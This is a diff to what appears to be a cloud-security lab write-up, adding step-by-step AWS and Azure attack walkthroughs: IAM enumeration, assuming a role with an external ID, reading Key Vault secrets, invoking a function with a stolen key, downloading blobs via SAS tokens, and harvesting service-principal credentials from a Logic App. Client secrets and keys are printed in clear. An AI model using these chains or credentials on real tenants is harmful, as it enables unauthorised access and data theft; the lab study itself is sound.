@@ -646,7 +646,7 @@ aws sts get-caller-identity
 aws iam list-user-policies --user-name DevLead
 
 # extract more details by performing **get-user-policy**:
-aws iam get-user-policy --user-name DevLead  --policy-name  user-policy
+aws iam get-user-policy --user-name DevLead --policy-name user-policy
 ```
 3. The SSM Parameter Discovery
 ```sh
@@ -701,11 +701,206 @@ aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/05826443
 ```
 ---
 ## Assume & Decrypt (or vice versa)
+1. configure creds `aws configure` + `aws sts get-caller-identity`
+2. Investigate IAM Permissions
+```sh
+aws iam list-user-policies --user-name Operation_Manager
+```
+3. Analyze Policy Permissions
+```sh
+aws iam get-user-policy --user-name Operation_Manager --policy-name Operation_Manager_User_Policy
+```
+From these results, we confirm that Operation_Manager can:
+- Read-only visibility into IAM users and policies (can enumerate and inspect policies but cannot change anything).
+- S3 Access: Full read-only access to the proj-446792 bucket (list and download objects).
+The user has read-only privileges. They cannot create, modify, or delete S3 objects, IAM resources, or any other AWS resources, but can view and download the data stored in the proj-446792 S3 bucket.
+4. The S3 Object Discovery
+```sh
+aws s3 ls s3://proj-446792
+aws s3 cp s3://proj-446792/proj-446792-config.json .
+```
+Although the s3:GetObject permission exists, the object is encrypted with a customer-managed AWS KMS key.
+Attempt to Enumerate KMS Keys:
+```sh
+aws kms list-keys --region us-east-1
+```
+While direct KMS enumeration is blocked, the policy does grant broad read access to IAM.
 
+**Look for Role-Assumption Opportunities:**
+If we discover a role with broader permissions, especially one allowing sts:AssumeRole, we might be able to pivot.
+You can use the IAM list-roles command combined with a JMESPath filter to search every role’s assume-role policy and return only those whose trust relationship lists the Operation_Manager user as a principal.
+```sh
+aws iam list-roles --query "Roles[?to_string(AssumeRolePolicyDocument.Statement[].Principal.AWS) != '' && contains(to_string(AssumeRolePolicyDocument.Statement[].Principal.AWS), 'arn:aws:iam::058264439561:user/Operation_Manager')].Arn" --output json
+```
+After identifying the customer-onboard-role as assumable by the Operation_Manager user, the next step is to examine the role’s inline policies to see what actions it allows.
+```sh
+aws iam list-role-policies --role-name customer-onboard-role
 
+aws iam get-role-policy --role-name customer-onboard-role --policy-name customer-onboard-role-policy
+```
+5. Assume to Decrypt
+```sh
+aws sts assume-role --role-arn arn:aws:iam::058264439561:role/customer-onboard-role --role-session-name tempSession
+```
+Even though the trust policy lists the Operation_Manager user as a principal, the role cannot be assumed without an additional parameter.
+```sh
+aws iam get-role --role-name customer-onboard-role
+```
+The trust policy includes an ExternalId condition. This means AWS requires the external ID to match in order for the AssumeRole action to succeed.
+```sh
+aws sts assume-role --role-arn arn:aws:iam::058264439561:role/customer-onboard-role --role-session-name tempSession --external-id A7F3K2-9X0B5D-Q4M8N1-V6P7R3
+```
+6. Accessing the S3 Bucket
+```sh
+aws configure set aws_access_key_id [key-id]
+aws configure set aws_secret_access_key [Secret-id]
+aws configure set aws_session_token [token]
 
+aws sts get-caller-identity
 
+aws s3 ls s3://proj-446792
+aws s3 cp s3://proj-446792/proj-446792-config.json .
+```
+---
+## Function's Backdoor Route
+1. Discover the Tenant ID and login
+```sh
+https://login.microsoftonline.com/secure-corp.org/.well-known/openid-configuration
 
+f2a33211-e46a-4c92-b84d-aff06c2cd13f
+
+az login --service-principal -u 72e81160-1944-4aa5-8a2d-e30c53dbd9b2 -p k5m8Q~tLSVXpbWVxPEX1cH44mFzKzDv6QYpinc6O --tenant f2a33211-e46a-4c92-b84d-aff06c2cd13f
+
+az account show
+```
+2. Role Enumeration – Know The Permissions
+```sh
+az role assignment list --assignee 291c1bef-0ea8-4591-a810-67ff0fc5a44b --output json --all
+
+#To get the permissions attached in the role:
+az role definition list --name "secops-func_Role1" --query "[].{RoleName:roleName, Permissions:permissions}" --output json
+```
+3. Extracting the Function Key from Azure Key Vault
+```sh
+az keyvault list --output table
+
+#Now let’s try to list secrets stored in this KeyVault:
+az keyvault secret list --vault-name secops-func-kv --output table
+
+#Now try to get the value of the secret:
+az keyvault secret show --vault-name secops-func-kv --name secops-func-key --query value --output tsv
+```
+4. Triggering the Azure Function (The Backdoor Route)
+```sh
+#Try to list all the Function Apps
+az functionapp list --resource-group secopsfunc
+
+#So we found the function-App name and we have one function Key as well, so through this we can invoke the function.
+curl "https://secops-func.azurewebsites.net/api/secops?code=vRAYaIyGzn6q52XWP_-ne9PN4bZzUghPq_b-PclNmro8AzFuK0M7VQ==&expiry=15"
+```
+5. Weaponizing the SAAS Token
+```sh
+az storage container list --account-name secopsdatastoreacc --sas-token "st=2025-06-19T09%3A52....." --output table
+
+#Now let’s try to list blobs if present in secopsdatastoreacont
+az storage blob list --account-name secopsdatastoreacc --container-name secopsdatastoreacont --sas-token "st=2025-06-19T09%3A52....." --output table
+
+#Download file
+az storage blob download --account-name secopsdatastoreacc --container-name secopsdatastoreacont --name Flag.txt --file Flag.txt --sas-token "st=2025-06-19T09%3A52....."
+```
+---
+## APP Callback Chaos
+1. login
+```sh
+az login --service-principal -u 76e1a895-1f05-4165-83ab-<redacted> -p 6LU8Q~<redacted> --tenant f2a33211-e46a-4c92-b84d-aff06c2cd13f
+
+az account show
+
+ACCESS_TOKEN=$(az account get-access-token --resource https://management.azure.com/ --query accessToken -o tsv)
+```
+2. Role Enumeration – Know The Permissions
+```sh
+az role assignment list \
+    --assignee e8f4ab33-1a64-476d-9af0-f7b33eec15ae \
+    --resource-group LogicAPP-Rg \
+    --subscription 662a4fee-a3ba-49b3-9caf-8c20ed04503f \
+    --output json
+```
+3. Enumerating Logic App Workflow
+```sh
+#тут мы получаем url
+az logic workflow list \
+    --resource-group LogicAPP-Rg \
+    --subscription 662a4fee-a3ba-49b3-9caf-8c20ed04503f \
+    --output json
+```
+4. Triggering the Azure Logic APP
+```sh
+#тут мы получаем креды
+curl -X POST \
+'https://prod-42.eastus.logic.azure.com:443/workflows/c6f0176db15c466498c89e910ba8b4fe/triggers/When_a_HTTP_request_is_received/paths/invoke?api-version=2016-06-01&sp=%2Ftriggers%2FWhen_a_HTTP_request_is_received%2Frun&sv=1.0&sig=Zl-wTFfaCL1I_BwHVUqYzQbywNUoaSZg88NcfiDX3IQ' \
+-H 'Content-Type: application/json' \
+-d '{}'
+```
+5. Authenticating with new service principal
+```sh
+curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "client_id=4f77df99-134e-4602-97b7-a3c0e73f9667" -d "scope=https://graph.microsoft.com/.default" -d "client_secret=UYY8Q~oCHFS2GjQReHcZ3G8lm_X4OLWMF4dgna_q" -d "grant_type=client_credentials" "https://login.microsoftonline.com/f2a33211-e46a-4c92-b84d-aff06c2cd13f/oauth2/v2.0/token"
+```
+6. Connect to Microsoft Graph API
+```sh
+GRAPH_TOKEN="eyJ0eXAiOiJKV1QiLCJ..."
+```
+7. Enumerate App Registrations
+```sh
+az rest --method GET \
+    --url "https://graph.microsoft.com/v1.0/applications" \
+    --headers "Authorization=Bearer $GRAPH_TOKEN" \
+    --output json
+    
+
+az rest --method GET \
+    --url "https://graph.microsoft.com/v1.0/applications" \
+    --headers "Authorization=Bearer $GRAPH_TOKEN" \
+    --query "value[].{Name:displayName, AppId:id, Created:createdDateTime}" \
+    --output table
+```
+8. Investigate API Permissions
+```sh
+az rest --method GET \
+    --url "https://graph.microsoft.com/v1.0/applications/4652ca30-6752-40bc-abbc-730878eb7fdf" \
+    --headers "Authorization=Bearer $GRAPH_TOKEN" \
+    --output json
+```
+9. Find the Exact API Role
+```sh
+az rest --method GET \
+    --url "https://graph.microsoft.com/v1.0/applications/4652ca30-6752-40bc-abbc-730878eb7fdf" \
+    --headers "Authorization=Bearer $GRAPH_TOKEN" \
+    --query "requiredResourceAccess" \
+    --output json
+
+MSGRAPH_SP=$(az rest --method GET \
+    --url "https://graph.microsoft.com/v1.0/servicePrincipals?$filter=displayName eq 'Microsoft Graph'" \
+    --headers "Authorization=Bearer $GRAPH_TOKEN" \
+    --query "value[0].id" -o tsv)
+
+az rest --method GET \
+    --url "https://graph.microsoft.com/v1.0/servicePrincipals/$MSGRAPH_SP" \
+    --headers "Authorization=Bearer $GRAPH_TOKEN" \
+    --query "appRoles" \
+    --output json
+
+GRAPH_ROLE_ID="9a5d68dd-52b0-4cc2-bd40-abcf44ac3a30"
+MSGRAPH_SP_ID=$(az rest --method GET \
+    --url "https://graph.microsoft.com/v1.0/servicePrincipals?\$filter=displayName eq 'Microsoft Graph'" \
+    --headers "Authorization=Bearer $GRAPH_TOKEN" \
+    --query "value[0].id" -o tsv)
+
+az rest --method GET \
+    --url "https://graph.microsoft.com/v1.0/servicePrincipals/$MSGRAPH_SP_ID" \
+    --headers "Authorization=Bearer $GRAPH_TOKEN" \
+    | jq --arg ROLE_ID "$GRAPH_ROLE_ID" '.appRoles[] | select(.id==$ROLE_ID)'
+```
 
 
 # Defensive
